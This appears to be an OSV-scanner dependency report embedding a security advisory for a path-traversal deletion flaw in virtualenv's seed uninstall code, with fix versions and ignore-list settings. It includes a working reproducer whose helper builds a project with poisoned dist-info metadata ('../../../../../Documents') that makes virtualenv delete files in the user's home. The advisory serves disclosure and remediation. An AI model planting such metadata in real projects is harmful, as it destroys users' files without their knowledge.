                "text": "**Your dependency is vulnerable to [CVE-2026-113719](https://osv.dev/CVE-2026-113719)**.\n\n## [GHSA-hhxq-47xx-j5xx](https://osv.dev/GHSA-hhxq-47xx-j5xx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The app-data seeder joins paths from existing distribution metadata to site-packages and deletes the resulting paths\n\u003e without checking containment within the environment.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-SXOEHWP7` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Removal of a previously installed seed package.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e An environment being reused must contain distribution metadata influenced by another account. The invoking user must\n\u003e have deletion rights over the paths named by that metadata. Installing a new environment without existing package\n\u003e metadata does not enter this cleanup path.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [seed uninstall](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e Before reinstalling a seed wheel, `PipInstall._uninstall_previous_version()` accepts an existing `pip-*.dist-info`\n\u003e directory in the destination. `_uninstall_dist()` reads its `top_level.txt` and `RECORD`, joins each entry to\n\u003e `site-packages`, and deletes the result. It does not check whether `..`, an absolute entry, or a linked parent takes the\n\u003e path outside the environment. The default app-data seeder reaches this path when it reuses a tree containing\n\u003e seed-package metadata; `--clear` removes that tree first.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner prepared a project with `.venv/lib/python3.14/site-packages/pip-1.0.dist-info/`. Its `top_level.txt`\n\u003e contained `../../../../../Documents`; its `RECORD` named `../../../../../notes.txt,,`. The user's home initially held\n\u003e `Documents/thesis/chapter1.txt` and `notes.txt`. Running `virtualenv .venv` exited successfully but removed both paths.\n\u003e A control tree with `top_level.txt` set to `pip` and a normal `pip/__init__.py` RECORD entry left the home files in\n\u003e place. The reproducer prints `BUG` only when the control files survive and both attack targets disappear.\n\u003e \n\u003e The deletion uses the invoking user's permissions and runs during creation, before any use of the environment. It\n\u003e requires an existing destination that another account could populate; a fresh empty environment does not supply hostile\n\u003e metadata. The report traces this cleanup to #2186, first released in 20.8.1.\n\u003e [PR #3428](https://github.com/pypa/virtualenv/pull/3428) checks each deletion path against the resolved environment root\n\u003e and refuses to delete the root itself.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as Prepared .venv metadata\n\u003e     participant V as App-data seeder\n\u003e     participant P as site-packages\n\u003e     participant H as User home\n\u003e     A-\u003e\u003eP: top_level.txt names ../../../../../Documents\n\u003e     A-\u003e\u003eP: RECORD names ../../../../../notes.txt\n\u003e     V-\u003e\u003eP: read pip-1.0.dist-info before reinstall\n\u003e     P-\u003e\u003eH: join entries without containment check\n\u003e     V-\u003e\u003eH: remove Documents and notes.txt\n\u003e     V--\u003e\u003eA: virtualenv exits successfully\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-SXOEHWP7`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e work = Path(\"/tmp/repro-seed-uninstall\")\n\u003e shutil.rmtree(work, ignore_errors=True)\n\u003e USER_FILES = (\"Documents/thesis/chapter1.txt\", \"notes.txt\")\n\u003e \n\u003e \n\u003e def make_home(name):\n\u003e     home = work / name\n\u003e     (home / \"Documents\" / \"thesis\").mkdir(parents=True)\n\u003e     (home / \"Documents\" / \"thesis\" / \"chapter1.txt\").write_text(\"months of work\\n\")\n\u003e     (home / \"notes.txt\").write_text(\"my notes\\n\")\n\u003e     return home\n\u003e \n\u003e \n\u003e def unpack_attacker_project(home, top_level_line, record_line):\n\u003e     subprocess.run(\n\u003e         [sys.executable, \"/tmp/repro.d/make_project_tree.py\", home / \"project\", top_level_line, record_line],\n\u003e         check=True,\n\u003e     )\n\u003e \n\u003e \n\u003e def user_runs_virtualenv(home):\n\u003e     # HOME only gives each run its own ~ and app-data; --no-periodic-update keeps the run offline\n\u003e     result = subprocess.run(\n\u003e         [\"virtualenv\", \"--no-periodic-update\", \".venv\"],\n\u003e         cwd=home / \"project\",\n\u003e         env={**os.environ, \"HOME\": str(home)},\n\u003e         stdout=subprocess.PIPE,\n\u003e         text=True,\n\u003e         check=True,\n\u003e     )\n\u003e     print(result.stdout, end=\"\")\n\u003e \n\u003e \n\u003e def files_left(home):\n\u003e     return [f for f in USER_FILES if (home / f).exists()]\n\u003e \n\u003e \n\u003e # control: the project ships well-formed pip metadata\n\u003e control_home = make_home(\"control\")\n\u003e unpack_attacker_project(control_home, \"pip\", \"pip/__init__.py,,\")\n\u003e user_runs_virtualenv(control_home)\n\u003e control_left = files_left(control_home)\n\u003e print(f\"CONTROL  user files still in ~ after virtualenv: {control_left}\")\n\u003e \n\u003e # attack: site-packages is ~/project/.venv/lib/python3.X/site-packages, so five \"..\" is ~\n\u003e attack_home = make_home(\"attack\")\n\u003e unpack_attacker_project(attack_home, \"../../../../../Documents\", \"../../../../../notes.txt,,\")\n\u003e print(f\"BEFORE   user files in ~ before virtualenv: {files_left(attack_home)}\")\n\u003e user_runs_virtualenv(attack_home)\n\u003e attack_left = files_left(attack_home)\n\u003e print(f\"OBSERVED user files still in ~ after virtualenv: {attack_left}\")\n\u003e \n\u003e # check: creating an environment must never delete the user's files outside it\n\u003e print(\"BUG\" if control_left == list(USER_FILES) and attack_left == [] else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/make_project_tree.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e project = Path(sys.argv[1])\n\u003e top_level_line = sys.argv[2]\n\u003e record_line = sys.argv[3]\n\u003e \n\u003e project.mkdir(parents=True)\n\u003e (project / \"README\").write_text(\"Set up with: virtualenv .venv\\n\")\n\u003e \n\u003e # a leftover .venv claiming pip 1.0 is installed; one copy per lib/python3.X, as the victim's Python is unknown\n\u003e for minor in range(9, 16):\n\u003e     dist_info = project / \".venv\" / \"lib\" / f\"python3.{minor}\" / \"site-packages\" / \"pip-1.0.dist-info\"\n\u003e     dist_info.mkdir(parents=True)\n\u003e     (dist_info / \"top_level.txt\").write_text(top_level_line + \"\\n\")\n\u003e     (dist_info / \"RECORD\").write_text(record_line + \"\\n\")\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Seed cleanup can delete files outside the environment or the environment root itself. The invoking user must have\n\u003e deletion rights over those paths.\n\u003e \n\u003e Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix skips cleanup paths outside the resolved environment root, and the root itself, with a warning. Final\n\u003e links are removed without following their targets; parent links participate in containment checks.\n\u003e \n\u003e Fix: [PR #3428](https://github.com/pypa/virtualenv/pull/3428).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Recreate environments from a trusted empty destination rather than reseeding a tree with untrusted installed metadata.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-SXOEHWP7.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-hhxq-47xx-j5xx | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113719\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113719\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
